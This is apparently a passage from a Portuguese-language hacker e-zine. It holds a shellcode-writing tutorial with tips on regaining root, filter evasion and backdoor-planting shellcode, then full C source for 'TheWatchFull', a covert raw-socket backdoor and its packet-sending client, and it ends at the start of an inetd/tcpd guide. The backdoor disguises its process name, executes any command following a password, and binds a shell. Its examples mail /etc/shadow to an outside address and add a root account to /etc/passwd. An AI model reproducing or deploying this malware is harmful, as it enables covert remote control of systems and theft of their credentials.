Breakpoint 1, 0x80483f5 in main ()
(gdb) info reg ebx
ebx            0x8049488        134517896
(gdb)


   O que fizemos aki foi colocar um breakpoint na linha que faz a chamada 
ao ponteiro de funcao. Rodamos o programa e ele parou no local indicado. 
Entao lemos o valor de %ebx para saber para onde ele esta apontando. O 
endereco obtido foi 0x8049488.
   Agora eh simples...

(gdb) disass 0x8049488
Dump of assembler code for function sc:
0x8049488 <sc>: xor    %eax,%eax
0x804948a <sc+2>:       inc    %eax
0x804948b <sc+3>:       xor    %ebx,%ebx
0x804948d <sc+5>:       int    $0x80
End of assembler dump.
(gdb)

   Ae esta! Exatamente como o fizemos.
   Esta rotina embora seja simples e facil de entender, ainda nao foi 
mencionada em nenhum outro texto de shellcode (pelo menos nos que eu ja 
li) e como pode-se notar, eh realmente util para traduzir shellcodes.
   Iremos usa-la novamente no decorrer desta materia.





------------------------------------------------------------------------
CRIANDO FUNCOES EM SHELLCODE
############################

   Esta secao eh apenas para a pratica em assembly. Veremos como eh 
possivel contruir funcoes reais em shellcode e nao somente incluir 
instrucoes para serem executadas.
   Entra mais como curiosidade do que utilidade, pois aqui veremos como 
atualizar o base pointer, criar return address, buscar variaveis passadas 
como argumento, etc em assembly e depois transformar o code em shellcode.

   Nosso objetivo aki eh criar uma funcao que simplesmente escreva uma 
mensagem qquer na tela. Simples...
   Para isso usaremos um syscall a funcao write().
   Sua sintaxe eh: ssize_t write(int fd, const void *buf, size_t count);
   Para executa-la em assembly precisamos atualizar os registradores como:

   AX = 0x04 (write)
   BX = int fd
   CX = const void *buf
   DX = size_t count
   E entao executar a syscall (int $0x80).

   Como queremos escrever a mensagem na tela, podemos adiantar que nosso 
BX sera 1 (stdout). A string (*buf) e o tamanho (count) serao passados 
como argumento para a funcao.
   Agora, voce ja deve ter em mente parte do code em asm... entao vamos ir 
por partes.

   A primeira coisa a se fazer qdo inicia-se uma funcao eh sempre: 
   1. Criar um return address (pelo qual a funcao ira retornar) e joga-lo 
      na stack;
   2. Atualizar o Base Pointer(%ebp) com o valor do Stack Pointer(%esp).
   Para isso bastam 2 linhas simples:

push %ebp            //Passo 1
movl %esp, %ebp      //Passo 2

   Em seguida deveriamos fazer alguns calculos sobre o Stack Pointer (%esp)
para as variaveis locais da funcao. Como nossa funcao nao ira necessitar 
variaveis locais, iremos pular esta parte.

   Proximo passo: Atualizar os registradores para a chamada ao write();
xorl %eax, %eax         //eax = 0
movl %eax, %ebx         //ebx = 0
movb $0x04, %al         //eax = 0x04
inc %ebx                //ebx = 0x01

   Note que talvez eu nao tenha usado as mesmas rotinas que voce imaginou, 
mas lembre-se que estamos lidando com shellcode e portanto, nao podemos 
deixar que nossa string tenha nenhum 0x00.
   Para isso evite mover valores pequenos diretamente a registradores. 
   Como por exemplo:    movl $0x04, %eax
   Foi substituido por: xorl %eax, %eax
                        movb $0x04, %al
   Quem nao esta familharizado com asm (nao deveria nem estar lendo esta 
materia) os registradores eax, ebx, ecx, edx podem ser acessados por suas 
partes altas (ah, bh, ch, dh) e baixas (al, bl, cl, dl). 
   Para evitar 0x00 acostume-se a zerar os registradores com xorl e mover 
dados para suas partes baixas. Qdo o valor for movido de outro registrador 
ou um valor de 4bytes nao tera problemas.

   Voltando a nossa funcao... faltaram 2 registradores (cx e dx). Estes 
registradores serao passados por argumentos na funcao. Entao colocaremos 
eles em ordem de chamada. O primeiro argumento deve ser a string (que sera 
colocada em cx) e o segundo sera o tamanho da string (colocada em dx).
   Sendo assim, qdo a funcao for chamada o programa executara o seguinte 
(isso nao faz parte do nosso codigo):
push <tamanho da string>
push <endereco da string>
call <nossa funcao>

   Para pegarmos estes argumentos da stack, devemos fazer alguns calculos 
sobre o Base Pointer (%ebp). 
   Atualmente o Base Pointer (%ebp) aponta para o return address (a 
ultima coisa q foi jogada na stack). Porem qdo usado a instrucao call 
para chamar a funcao, tambem foi jogado na stack o endereco da proxima 
instrucao a ser executada qdo a funcao retornar.
   Como cada endereco de memoria possui 4 bytes, temos ao total 8 bytes 
na stack antes de nossos argumentos. Portanto para move-los da stack para 
os registradores faremos:

movl 0x08(%ebp), %ecx          //move o endereco da string para ecx
movl 0x0c(%ebp), %edx          //move o tamanho da string para edx

   Pronto! Os registradores estao todos com seus valores... agora basta 
executar a syscall e retornar da funcao...
int $0x80
leave
ret

   Juntando tudo, temos nosso code completo:

<++> shellcode/asm-write1.c
int main() {
   __asm__("   push %ebp
               movl %esp, %ebp
               xorl %eax, %eax
               movl %eax, %ebx
               movb $0x04, %al
               inc %ebx
               movl 0x08(%ebp), %ecx
               movl 0x0c(%ebp), %edx
               int $0x80
               leave
               ret
   ");
}
<-->

   Vamos pegar nossa string agora...

[root@struck sc]# gcc asm-write1.c -o asm-write1
[root@struck sc]# gdb asm-write1
[...]
(gdb) disass main
Dump of assembler code for function main:
0x80483b4 <main>:       push   %ebp
0x80483b5 <main+1>:     mov    %esp,%ebp
0x80483b7 <main+3>:     push   %ebp
0x80483b8 <main+4>:     mov    %esp,%ebp
0x80483ba <main+6>:     xor    %eax,%eax
0x80483bc <main+8>:     mov    %eax,%ebx
0x80483be <main+10>:    mov    $0x4,%al
0x80483c0 <main+12>:    inc    %ebx
0x80483c1 <main+13>:    mov    0x8(%ebp),%ecx
0x80483c4 <main+16>:    mov    0xc(%ebp),%edx
0x80483c7 <main+19>:    int    $0x80
0x80483c9 <main+21>:    leave
0x80483ca <main+22>:    ret
0x80483cb <main+23>:    leave
0x80483cc <main+24>:    ret
0x80483cd <main+25>:    lea    0x0(%esi),%esi
End of assembler dump.
(gdb) x/20xb main+3
0x80483b7 <main+3>:     0x55    0x89    0xe5    0x31    0xc0    0x89    
0xc3   0xb0
0x80483bf <main+11>:    0x04    0x43    0x8b    0x4d    0x08    0x8b    
0x55   0x0c
0x80483c7 <main+19>:    0xcd    0x80    0xc9    0xc3


   Ae esta! Agora vamos testa-la...

<++> shellcode/sc-write1.c
char sc[] =
   "\x55\x89\xe5\x31\xc0\x89\xc3\xb0\x04\x43"
   "\x8b\x4d\x08\x8b\x55\x0c\xcd\x80\xc9\xc3";

void print(char *str) {
   void (*exec)(char *s, int l) = (void *) sc;
   exec(str, strlen(str));
}
main() {
   print("hello\n");
}
<-->

   Aki temos a funcao print() como interface para nosso shellcode. Note 
que declaramos o ponteiro para a funcao com os dois argumentos que serao 
usados pelo code assemblico.
   Vamos depurar este programa para ver se nosso calculo com o ebp foi 
correto e o shellcode realmente moveu os argumentos para os registradores 
e nao "lixo"...

[root@struck insec]# gdb sc-write1
[...]
(gdb) disass print
Dump of assembler code for function print:
0x80483e4 <print>:      push   %ebp
0x80483e5 <print+1>:    mov    %esp,%ebp
0x80483e7 <print+3>:    sub    $0x14,%esp
0x80483ea <print+6>:    push   %ebx
0x80483eb <print+7>:    movl   $0x8049494,0xfffffffc(%ebp)
0x80483f2 <print+14>:   add    $0xfffffff8,%esp
0x80483f5 <print+17>:   add    $0xfffffff4,%esp
0x80483f8 <print+20>:   mov    0x8(%ebp),%eax
0x80483fb <print+23>:   push   %eax
0x80483fc <print+24>:   call   0x80482f0 <strlen>
0x8048401 <print+29>:   add    $0x10,%esp
0x8048404 <print+32>:   mov    %eax,%eax
0x8048406 <print+34>:   push   %eax
0x8048407 <print+35>:   mov    0x8(%ebp),%eax
0x804840a <print+38>:   push   %eax
0x804840b <print+39>:   mov    0xfffffffc(%ebp),%ebx
0x804840e <print+42>:   call   *%ebx
0x8048410 <print+44>:   add    $0x10,%esp
0x8048413 <print+47>:   mov    0xffffffe8(%ebp),%ebx
0x8048416 <print+50>:   leave
0x8048417 <print+51>:   ret
End of assembler dump.

   Note que eh nesta linha que o programa chama o shellcode:
0x804840e <print+42>:   call   *%ebx

   Portanto iremos repetir os passos dados qdo traduzimos o shellcode 
anterior. Vamos colocar um breakpoint nesta linha, executar e qdo o 
programa parar vemos o endereco que aponta %ebx.

(gdb) break *print+42
Breakpoint 1 at 0x804840e
(gdb) run
Starting program: /root/sc/sc-write1
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.

Breakpoint 1, 0x804840e in print ()
(gdb) info reg ebx
ebx            0x8049494        134517908
(gdb) disass 0x8049494
Dump of assembler code for function lamecode:
0x8049494 <sc>:   push   %ebp
0x8049495 <sc+1>: mov    %esp,%ebp
0x8049497 <sc+3>: xor    %eax,%eax
0x8049499 <sc+5>: mov    %eax,%ebx
0x804949b <sc+7>: mov    $0x4,%al
0x804949d <sc+9>: inc    %ebx
0x804949e <sc+10>:        mov    0x8(%ebp),%ecx
0x80494a1 <sc+13>:        mov    0xc(%ebp),%edx
0x80494a4 <sc+16>:        int    $0x80
0x80494a6 <sc+18>:        leave
0x80494a7 <sc+19>:        ret
End of assembler dump.
(gdb)


   Ae esta nossa criacao!!! Continuando nossa depuracao, colocaremos outro 
breakpoint na linha <sc+16>. Assim, antes do syscall ser executado, 
poderemos verificar se os registradores estao todos com seu valores 
corretos.


(gdb) break *0x80494a4
Breakpoint 2 at 0x80494a4
(gdb) cont
Continuing.

Breakpoint 2, 0x80494a4 in sc ()
(gdb) info reg eax ebx ecx edx
eax            0x4      4
ebx            0x1      1
ecx            0x8048480        134513792
edx            0x6      6
(gdb) x/6bc 0x8048480
0x8048480 <_IO_stdin_used+4>:   104 'h' 101 'e' 108 'l' 108 'l' 111 'o' 10 '\n'
(gdb)


   Ok. Estao todos com seus valores corretos. Execute o programa para 
verificar seu perfeito funcionamento...

[root@struck insec]# ./sc-write1
hello

   Voalah! 
   Como pode-se perceber por esta secao, shellcodes podem ser criados a 
partir de qquer codigo assembly. No caso, criamos uma funcao de 2 
argumentos e ele funcionou sem problemas.
   Pode-se exploitar com shellcodes que executam um programa inteiro. Tudo 
depende da paciencia do programador em saber construir o programa e saber 
depura-lo atras de um erro q pode ocorrer.
   As tecnicas demonstradas ateh aqui servem para facilitar sua vida qdo 
estiver depurando um shellcode atras de um bug.




------------------------------------------------------------------------
SHELLCODE do write()
####################

   Este exemplo servira apenas para demonstrar como utilizar strings em um 
codigo assembly, organizando-a apos o code. Tecnica usada em todos os 
shellcodes que necessitam strings (ex execve).
   Como vimos antes, a syscall write() deve ser chamada da seguinte forma:

mov $0x04, %eax
mov <stream>, %ebx
mov <string>, %ecx 
mov <tamanho>, %edx
int $0x80

   Adiantando que queremos que nosso shellcode exiba a mensagem "alou!" 
(5 bytes) na tela (stdout == 1). Podemos comecar a escrever nosso code 
atualizando os valores dos registradores ax,bx e dx.

xorl %eax, %eax         //ax=0
movl %eax, %ebx         //bx=0
movl %eax, %edx         //dx=0
movb $0x04, %al         //ax=4 [ write() ]
inc %ebx                //bx=1 [ stdout ]
movb $0x06, %dl         //dx=6 [ tamanho ]

   Note que as instrucoes dadas deixaram o code maior e ira gerar maior 
processamento, porem nao havera' nenhum caractere 0x00 quando se 
transformar esse code em uma string.
   Para pegar a string usaremos um metodo classico:

<code>
jmp <code+33>
<code+4>
<code...>
<code+32>
call <code+4>
.string \"alou!\"

   O que foi feito aqui eh bem simples de se entender. Em certo ponto do 
code em que se necessita a string, colocamos um jmp para o fim do code, ou 
melhor, para a ultima instrucao do code. Esta devera ser um call chamando 
de volta a onde o code foi interrompido pelo jmp.
   Lembra que o call coloca na stack o endereco que vem depois de sua 
chamada? O que segue ele aki eh uma string, portanto teremos empilhado na 
stack o endereco da string.
   Apos isso basta fazer:

pop %ecx                 //Pega o endereco da string da stack
int $0x80
movl %ebx, %eax          //ax=1 [ exit() ]
xorl %ebx, %ebx          //bx=0 [ status ]
int $0x80

   Apos executarmos o syscall write() chamamos o exit() para que o 
programa acabe normalmente. 
   Passando tudo para um unico code assembly ficara:

<++> shellcode/asm-write2.c
int main() {
   __asm__(" xorl %eax, %eax
             movl %eax, %ebx
             movl %eax, %edx
             movb $0x04, %al
             inc %ebx
             movb $0x06, %dl

             nop

             pop %ecx
             int $0x80
             movl %ebx, %eax
             xorl %ebx, %ebx
             int $0x80

             nop
             .string \"alou!\"
   ");
}
<-->

   Nota importante: 2 nops foram colocados no code. Eles estao 
temporariamente substituindo as instrucoes jmp e call, pois temos que 
fazer alguns calculos com elas antes de chama-las.

[root@struck sc]# gcc asm-write2.c -oasm-write2
[root@struck sc]# gdb asm-write2
[...]
(gdb) disass main
Dump of assembler code for function main:
0x80483b4 <main>:       push   %ebp
0x80483b5 <main+1>:     mov    %esp,%ebp
0x80483b7 <main+3>:     xor    %eax,%eax
0x80483b9 <main+5>:     mov    %eax,%ebx
0x80483bb <main+7>:     mov    %eax,%edx
0x80483bd <main+9>:     mov    $0x4,%al
0x80483bf <main+11>:    inc    %ebx
0x80483c0 <main+12>:    mov    $0x6,%dl
0x80483c2 <main+14>:    nop
0x80483c3 <main+15>:    pop    %ecx
0x80483c4 <main+16>:    int    $0x80
0x80483c6 <main+18>:    mov    %ebx,%eax
0x80483c8 <main+20>:    xor    %ebx,%ebx
0x80483ca <main+22>:    int    $0x80
0x80483cc <main+24>:    nop
[...]
(gdb) x/22bx main+3
0x80483b7 <main+3>:     0x31    0xc0    0x89    0xc3    0x89    0xc2    0xb0
0x04
0x80483bf <main+11>:    0x43    0xb2    0x06    0x90    0x59    0xcd    0x80
0x89
0x80483c7 <main+19>:    0xd8    0x31    0xdb    0xcd    0x80    0x90
(gdb)

   Ja temos parte de nosso shellcode.
   Vou organiza-lo direito, separando cada cadeia de caractere a seu 
respectivo comando para poder depois saber de quantos bytes deve ser o 
pulo (jmp) e a chamada de volta (call).

char sc[] =
"\x31\xc0"         //xorl %eax, %eax
"\x89\xc3"         //movl %eax, %ebx
"\x89\xc2"         //movl %eax, %edx
"\xb0\x04"         //movb $0x04, %al
"\x43"             //inc %ebx
"\xb2\x06"         //movb $0x06, %dl
"\x90"             //nop
"\x59"             //pop %ecx                 #1byte
"\xcd\x80"         //int $0x80                #2bytes
"\x89\xd8"         //movl %ebx, %eax          #2bytes
"\x31\xdb"         //xorl %ebx, %ebx          #2bytes
"\xcd\x80"         //int $0x80                #2bytes
"\x90"             //nop                      #5bytes (call)
"alou!\n"
;

   Agora devemos substituir os nops por suas devidas funcoes.
   Do primeiro nop para o segundo sao 9 bytes (1+2+2+2+2).
   Como o segundo nop referencia a um call (q tem 5 bytes), para retornar 
sao os 9 bytes + 5 do call. Total: -14 bytes.
   Espero que voce ainda se lembre de como converter numeros negativos 
decimais em hexadecimais... =) -14 equivale a 0xfffffff2.
   As seguintes funcoes tem como equivalencia as strings:

funcao:                    string:
jmp +9                     "\xeb\x09"
jmp +11 (0x0b)             "\xeb\x0b"
jmp +256 (0xff)            "\xeb\xff"

call -14 (0xfffffff2)      "\xe8\xf2\xff\xff\xff"
call -15 (0xfffffff1)      "\xe8\xf1\xff\xff\xff"
call -16 (0xfffffff0)      "\xe8\xf0\xff\xff\xff"
call -257 (0xfffffeff)     "\xe8\xff\xfe\xff\xff"

   Se voce prestar um pouco de atencao logo vai encontrar uma logica.
   Estas sao as unicas funcoes que voce tera que colocar no code direto 
na forma de string. Pois elas nao sao interpretadas da forma correta em 
code asm.
   Como soh faltava essas 2 funcoes para completar o shellcode, basta 
substitui-las agora no lugar dos nops e voalah...

<++> shellcode/sc-write2.c
char sc[] =
"\x31\xc0"              //xorl %eax, %eax
"\x89\xc3"              //movl %eax, %ebx
"\x89\xc2"              //movl %eax, %edx
"\xb0\x04"              //movb $0x04, %al
"\x43"                  //inc %ebx
"\xb2\x06"              //mov $0x06, %dl
"\xeb\x09"              //jmp $0x09
"\x59"                  //pop %ecx           1byte
"\xcd\x80"              //int $0x80          2bytes
"\x89\xd8"              //movl %ebx, %eax    2bytes
"\x31\xdb"              //xorl %ebx, %ebx    2bytes
"\xcd\x80"              //int $0x80          2bytes
"\xe8\xf2\xff\xff\xff"  //call -0xf2         5bytes
"alou!\n";

main() {
  void (*exec)() = (void *) sc;
  exec();
}
<-->

   Pronto! Compile, execute, depure, brinque bastante com este e outros 
shellcodes ateh q voce domine este assunto.





------------------------------------------------------------------------
ADVANCED SHELLCODES
###################

   Nao vou explicar novamente como criar um execve_shellcode, pois isso 
eh o que voce mais vai encontrar por ae. Portanto como ultima secao desta 
materia vou dar uma explicacao sobre como criar shellcodes que derrubem 
"resistencias" do programa a ser exploitado.

   Como primeiro exemplo temos o caso de programas que usam setuid(), 
setgid() antes do overflow ocorrer. Caso voce use um simples shellcode 
execve, apenas sera chamada uma nova shell sem uid=0.
   Basta chamar as respectivas syscalls setuid() e setgid() novamente 
para voltar a ser root. Sintaxe dos syscalls:

int setuid(uid_t uid)
   AX = 23 (0x17)
   BX = uid

int setgid(gid_t gid)
   AX = 48 (0x2e)
   BX = gid

   No execve_shellcode adicione as linhas:

"\x31\xc0"              //xorl %eax, %eax
"\x89\xc3"              //movl %eax, %ebx
"\xb0\x17"              //movb $0x17, %al
"\xcd\x80"              //int $0x80        _setuid
"\xb0\x2e"              //movb $0x2e, %al
"\xcd\x80"              //int $0x80        _setgid


   Quase sempre um problema em exploitar algum programa pode ser resolvido 
com mudancas no shellcode como visto acima. 

   O antigo exploit do imapd tinha alguns problemas ae ser rodado. Nos 
primeiros testes com o exploit, verificou-se que o programa caia ao tentar 
executar "/BIN/SH". O problema era que o imapd faz conversoes de todos os 
caracteres para maiusculo, sendo assim qdo passavam "/bin/sh" junto ao 
shellcode ele tb era convertido para maiusculo.
   A solucao mais do que obvia era encriptar o /bin/sh com diminuindo 20 
do valor hexadecimal de cada caractere. Assim o imapd na interpretara mais 
o "/bin/sh" como string. Durante a execucao do shellcode, para descriptar, 
era feito:

[...]
popl %esi
addb $0x20,0x1(%esi)
addb $0x20,0x2(%esi)
addb $0x20,0x3(%esi)
[...]

   Ou um loop fazendo o mesmo.
   Este metodo tambem serve para criptografar o shellcode para passar por 
filtros contra exploits.

   Outro problema classico eh o dos ftpds. Exploits para wuftpd, proftpd, 
etc, que exploitam por contas anonymous/ftp devem conter shellcodes com 
syscall a chroot() para obter acesso a todo o sistema quando ganhar a 
rootshell. Isso porque voce ja deve ter percebido que logins anonymous tem 
permissoes restritas aos diretorios do sistema, "aprisionando" o usuario 
em um diretorio reestrito (ex. "/home/ftp").

   Em alguns casos eh preciso bindar uma porta, ou fazer um telnet reverso 
para obter shell no sistema. Esse eh o caso de exploits para daemons de 
udp ou que nao estabilizam uma conexao em tcp. Se voce pensa que eh 
impossivel fazer isso em asm in-line, de uma olhada nos exploits de bind.

   Tambem eh comum encontrar exploits com shellcodes que ja colocam 
backdoores no sistema usando syscalls de open/write no "/etc/passwd" para 
inserir contas roots, ou que criam suidbacks usando execve().






------------------------------------------------------------------------

   Acho que isso eh tudo.
   Nao quis me aprofundar muito nos bind_shellcodes nem em outros por pura 
falta de tempo para concluir essas materias. O assunto poderia ir mais 
longe porem deixa isso para proximas publicacoes.

   BIBLIOGRAFIA: 
   CHEAT, S. Struck's Brain. 21/jan/2001 RS imbeh.










        _xXXXP^''                             ``^YXXXx_
     _xXXXXP~       07 - TheWatchFull (TWF)       ~YXXXXx_
  _xXXXXXX(                                         )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                         )XXXXXXP~
     ~YXXXXb_             Cheat Struck            _dXXXXP~
        ~YXXXbx..                             ..xdXXXP~

   Esta eh minha mais nova backdoor. Bem... a minha mais nova backdoor 
publicada claro. Voce indica um protocolo que a backdoor ficara 
"vigiando".
   Quando a senha "STRUCK0WN" (pode ser alterada no source) for 
encontrada, a backdoor executa o comando de shell q vier em seguida. No 
lugar de um comando, voce pode colocar funcoes especiais da backdoor que 
servem para bindar uma porta (BINDME), ou desligar a backdoor (TURNOFF), 
ou apaga-la(DELETEME).
   A backdoor suporta os protocolos tcp, icmp e udp. Para enviar pacotes 
icmp e udp voce pode usar o programa sendp.c que coloquei junto a back. 
Para o protocolo tcp, basta que voce conecte-se em qquer porta aberta no 
server e digite "STRUCK0WN <comando>" para que o comando seja executado.
   Veja um exemplo:

[root#struck twf]# ./watch
[root@struck twf]# telnet 0 7374
Trying 0.0.0.0...
telnet: Unable to connect to remote host: Connection refused
[root@struck twf]# telnet 0 21
Trying 0.0.0.0...
Connected to 0.
Escape character is '^]'.
220 struck.machine FTP server (Version wu-2.6.0(1) Sat Sep 20 06:03:41 BRT 
2003) ready.
STRUCK0WN BINDME
530 Please login with USER and PASS.
quit
221 Goodbye.
Connection closed by foreign host.
[root@struck twf]# telnet 0 7374
Trying 0.0.0.0...
Connected to 0.
Escape character is '^]'.
bash#

   Voalah! Essa back sera bem util caso voce saiba como usa-la. Ela nao eh 
facilmente detectada pois na deixa nada aberto e tambem eh bastante 
pratica pois voce pode executar comandos por uma shell ou diretamente pela 
backdoor caso precise atualizar alguma coisa.... como por exemplo:

[root@struck New Folder]# telnet 0 110
Trying 0.0.0.0...
Connected to 0.
Escape character is '^]'.
+OK struck.machine POP3 Server (Version 1.006d) ready at <Tue Feb 26 
16:02:45 2002>
STRUCK0WN cat /etc/shadow | mail cheat@struck.8m.com
-ERR Invalid command; valid commands:  USER, APOP, QUIT
QUIT
+OK struck.machine POP3 Server (Version 1.006d) shutdown.
Connection closed by foreign host.
[root@struck New Folder]#

   Para se atualizar do arquivo de senhas da maquina.
   Nos comentarios do programa ha mais alguns exemplos de uso...



<++> twf/watch.c
/* TheWatchFull v0.2 (server)
   by Cheat Struck <cheat@struck.8m.com>

   TheWatchFull eh um novo tipo de backdoor criado por mim.
   O Programa "observa" todos os pacotes enviados para o servidor atravez
do protocolo especificado (icmp, tcp, udp). Ao identificar uma senha 
pre-definida em um dos pacotes, o conteudo eh executado.
   O conteudo do pacote pode ser um comando de shell ou um comando 
especial que sera interpretado pelo TWF.

   Comandos especiais:
   ^^^^^^^^^^^^^^^^^^
   TURNOFF         <----- Desliga a backdoor.
   DELETEME        <----- Desliga e deleta a backdoor.
   BINDME          <----- Abre Shell na porta 7374.

   Como usar:
   ^^^^^^^^^
   hostvuln# gcc tback.c -otback
   hostvuln# ./tback

   (TCP)
   local$ telnet hostvuln 80
    Trying 205.178.180.190...
    Connected to www.securitynetworks.com.
    Escape character is '^]'.
    STRUCK0WN echo "struck::0:0::/:/bin/sh" >> /etc/passwd
    Connection closed by foreign host.

   (ICMP)
   local$ gcc sendp.c -osendp
   local$ ./sendp 1 BINDME
    sent 15 bytes to x.x.x.x
   local$ telnet hostvuln 7374
    Trying x.x.x.x...
    Connected to hostvuln.
    Escape character is '^]'.
    hostvuln#

   (UDP)
   local$ ./sendp 17 "killall inetd"
    sent 22 bytes to x.x.x.x
   local$ telnet hostvuln 80
    Trying x.x.x.x...
    telnet: Unable to connect to remote host: Connection refused

*/

#define PASSWORD "STRUCK0WN"
#define FAKENAME "gpm" 
#define PROTOCOL 6 //1=ICMP
                   //6=TCP
                   //17=UDP
#define SIZE 4096

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int make_bind(struct in_addr addr);

int main(int argc, char *argv[]) {
  struct sockaddr_in fr0m;
  int tam, s0ck, i;
  char pkt[SIZE], id[SIZE], cmd[SIZE], realname[SIZE];
  pid_t pid;

  pid = fork();
  if (pid != 0) {
    exit(0);
  }

  strncpy(realname,argv[0],strlen(argv[0]));
  memset(argv[0], 0x00, strlen(argv[0]));
  strncpy(argv[0], FAKENAME, strlen(FAKENAME));

  for(i=1; i<=31 ; i++)
    signal(i, SIG_IGN);

  if ((s0ck = socket(AF_INET, SOCK_RAW, PROTOCOL)) == -1) return 0;

  for(;;) {

     memset(&pkt,0x00,sizeof(pkt));
     tam = sizeof(fr0m);
     if(recvfrom(s0ck,pkt,sizeof(pkt),0,(struct sockaddr *)&fr0m,&tam) == -1)
        exit(0);

     for(i=0; i<SIZE; i++) {
        memset(&id,0x00,sizeof(id));
        sscanf(&pkt[i], "%s%*c%*s", id);

        if(!strncmp(id,PASSWORD,strlen(PASSWORD))) {
            memset(&cmd,0x00,sizeof(cmd));
            sprintf(cmd,"%s",&pkt[i+strlen(PASSWORD)+1]);

            if (PROTOCOL == 6) cmd[strlen(cmd)-2] = '\0';

            /* Ztart the Special Commands */
            dup2(s0ck,0); dup2(s0ck,1); dup2(s0ck,2);
            if(!strncmp(cmd,"TURNOFF",7)) 
                  exit(0);
            else if(!strncmp(cmd,"DELETEME",8)) {
                  remove(realname);
                  exit(0); }
            else if(!strncmp(cmd,"BINDME",6)) 
                  make_bind(fr0m.sin_addr); 
            else system(cmd);
            break;
        }
     }
  }
}

int make_bind(struct in_addr addr) {
   int sock, remote;
   struct sockaddr_in sa, client;
   pid_t pid;

   pid=fork();
   if(pid == 0) {
   
      if((sock=socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0);
      sa.sin_addr = addr;
      sa.sin_family = AF_INET;
      sa.sin_port = htons(7374); //TETA
      memset(&(sa.sin_zero),0x00,8);

      if(bind(sock, (struct sockaddr *) &sa, sizeof(sa)) == -1) exit(0);
      if(listen(sock,1) == -1) exit(0);
      if((remote=accept(sock, (struct sockaddr *) &client, \
          (socklen_t *) sizeof(client))) == -1) exit(0);

      dup2(remote,0); dup2(remote,1); dup2(remote,2);
      execl("/bin/sh", "sh", "-i", 0);

      close(sock);
      exit(0);
   }
   return(0);
}
<-->



<++> twf/sendp.c
/* TheWatchFull v0.2 (client)
   by Cheat Struck <cheat@struck.8m.com>

   $ gcc sendp.c -osendp
   $ ./sendp 1 "echo muahahaha >> /etc/issue"


   Este programa envia pacotes identificados para o TWF servidor.
   O programa suporta 3 tipos de protocolos (icmp, tcp, udp) o qual deve 
ser especificado na linha de comando.
   O endereco da maquina (somente ips) deve ser especificado no source do 
programa assim como a senha utilizada no servidor.

   Nota: verifique se o numero do protocolo equivale ao mesmo no arquivo 
/etc/protocols. Se nao for o mesmo utilize o numero especificado neste 
arquivo.

 */

#define ATACK "127.0.0.1"   //Host onde esta rodando theWatchFull
#define PASSWORD "STRUCK0WN"

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>


int main(int argc, char *argv[]) {
  int sockfd;
  struct sockaddr_in ina;
  int numbytes, protocol;
  char pkt[4096]="";

  if(argc < 3) {
      printf("Use: %s <protocol> <comando>\n",argv[0]);
      printf("  -protocol: 1(ICMP), 6(TCP), 17(UDP)\n");
      exit(1);
  }
  if(strlen(argv[2]) > 4090) {
      printf("Buffer overflow!\n");
      exit(1);
  }

  
  protocol = atoi(argv[1]);
  sprintf(pkt,"%s %s", PASSWORD, argv[2]);
  if(protocol == 6) strcat(pkt,"  ");


  if ((sockfd = socket(AF_INET, SOCK_RAW, protocol)) == -1) {
      printf("err0: socket()\n");
      exit(1);
  }

  ina.sin_family = AF_INET;
  ina.sin_addr.s_addr = inet_addr(ATACK);
  bzero(&(ina.sin_zero), 8);

  if ((numbytes=sendto(sockfd, pkt, strlen(pkt), 0, 
      (struct sockaddr *)&ina, sizeof(struct sockaddr))) == -1) {
      printf("err0: sendto()");
      exit(1);
   }

   printf("sent %d bytes to %s\n",numbytes,inet_ntoa(ina.sin_addr));

}
<-->











        _xXXXP^''                             ``^YXXXx_
     _xXXXXP~          08 - Inetd e Tcpd          ~YXXXXx_
  _xXXXXXX(                                         )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                         )XXXXXXP~
     ~YXXXXb_             Cheat Struck            _dXXXXP~
        ~YXXXbx..                             ..xdXXXP~


   Topicos:
      1. INETD  
      1.1 INETD.CONF
      1.2 INTERNAL SERVICES
      1.3 REINICIANDO
      2. TCPD
      2.1 LOGS
      2.2 CONTROLE DE ACESSO
      2.2.1 ARQUIVOS DE ACESSO
      2.2.2 EXEMPLOS DE LISTAS
      2.2.3 WILDCARDS
      2.2.4 OPCOES EXTRAS
      2.2.5 EXPANCOES
      2.2.6 EXEMPLOS DE SISTEMAS FECHADOS
      2.2.7 EXEMPLOS DE SISTEMAS ABERTOS
      2.2.8 EXEMPLOS DE TRUQUES
      2.3 TCPDCHK
      2.4 TCPDMATCH
      3. HACKING
      4. SECURITY



  1. INETD  
##############

   Inetd e' o "super-servidor" de servicos de internet utilizado 
atualmente pela maioria dos sistemas unix (linux, bsd, sunos,...). Ele 
e' chamado durante o boot do sistema e listeneia conexoes para internet 
sockets dos servicos que serao rodados no sistema. Quando uma conexao e' 
estabelecida ele roda o programa correspondente ao servico.
   O inetd tambem pode ser iniciado por linha de comando. Sua sintaxe eh:

   inetd [-d] [-R rate] [arquivo de configuracao]

   As opcoes sao:
   -d        Modo debug
   -R rate   Especifica o numero de vezes que um servico pode ser chamado 
             por minuto. Por padrao este numero e' 256.




  1.1 INETD.CONF
####################

   O arquivo de configuracao caso nao especificado sera usado por padrao o 
arquivo /etc/inetd.conf. Em muitas distribuicoes este arquivo ja vem 
configurado para rodar os servicos mais comuns de um servidor, tais como 
ftp, telnet, smtp, pop3 entre outros. 
   As linhas que configurao o servico possuem 7 campos separados por 
espaco ou tab. Estes campos sao:

<nome> <socket> <protocolo> <espera> <usuario> <programa> <argumentos>

   Onde:
<nome>      Eh o nome do servico que sera rodado. Exs: ftp, telnet,...
            Os nomes dos servicos estao listados no arquivo /etc/services
<socket>    Tipo de socket que sera' usado. Tal como stream, dgram, raw, 
            rdm ou seqpacket.
